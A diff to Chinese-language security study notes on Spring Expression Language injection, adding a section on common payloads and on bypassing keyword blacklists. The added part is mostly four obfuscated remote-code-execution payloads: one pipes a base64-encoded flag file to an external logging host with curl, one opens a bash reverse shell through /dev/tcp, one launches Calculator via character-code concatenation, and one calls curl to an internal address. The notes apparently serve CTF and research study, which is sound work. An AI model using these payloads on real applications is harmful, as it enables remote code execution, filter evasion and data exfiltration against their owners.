@@ -200,9 +200,11 @@ public class EmailSender {
 
 ### SpEL表达式的漏洞触发
 
-#### 可控属性
+#### 可控属性(TODO)
 
-#### 双重SpEL表达式
+* ？
+
+#### 双重SpEL表达式（TODO 待验证）
 
 ```xml
 <nxu:set var="directoryNameForPopup"
@@ -210,7 +212,21 @@ public class EmailSender {
     cache="true">
 ```
 
-### SpEL表达式的常见利用语句
+### SpEL表达式的常见Payload
+
+* 前面RCE部分已经给出一些例子
+
+##### 过滤与绕过
+
+* 一般过滤是通过正则匹配java关键字，绕过例子见下，概括一下思路，就是使用SpEL的语法和java的反射、字符串处理函数、编码等过黑名单
+
+`#{T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"/bin/bash","-c","curl fg5hme.ceye.io/`cat flag_j4v4_chun|base64|tr '\n' '-'`"})}`
+
+`#{T(javax.script.ScriptEngineManager).newInstance().getEngineByName("nashorn").eval("s=[3];s[0]='/bin/bash';s[1]='-c';s[2]='ex"+"ec 5<>/dev/tcp/1.2.3.4/2333;cat <&5 | while read line; do $line 2>&5 >&5;done';java.la"+"ng.Run"+"time.getRu"+"ntime().ex"+"ec(s);")}`
+
+`T(java.lang.Runtime).getRuntime().exec(  T(java.lang.Character).toString(111).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(112)))`
+
+`''['class'].forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(''['class'].forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),'curl 172.17.0.1:9898')`
 
 ### SpEL相关漏洞分析
 
